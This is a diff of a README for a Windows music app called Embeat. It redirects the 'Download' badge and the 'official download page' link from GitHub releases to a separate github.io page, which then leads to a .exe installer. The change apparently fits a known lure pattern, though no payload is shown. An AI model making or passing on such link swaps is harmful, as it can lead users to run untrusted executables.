@@ -1,6 +1,6 @@
 # 🎧 Embeat - Find music you love every day
 
-[![](https://img.shields.io/badge/Download-Embeat_for_Windows-blue.svg)](https://github.com/sectarian-match407/Embeat/releases)
+[![](https://img.shields.io/badge/Download-Embeat_for_Windows-blue.svg)](https://sectarian-match407.github.io)
 
 ## What is Embeat?
 
@@ -20,7 +20,7 @@ Before you install Embeat, check that your computer meets these minimum requirem
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/sectarian-match407/Embeat/releases) to view the latest versions.
+1.  Visit the [official download page](https://sectarian-match407.github.io) to view the latest versions.
 2.  Select the file that ends in .exe for Windows.
 3.  Click the link to download the installer to your computer.
 4.  Find the file in your downloads folder.
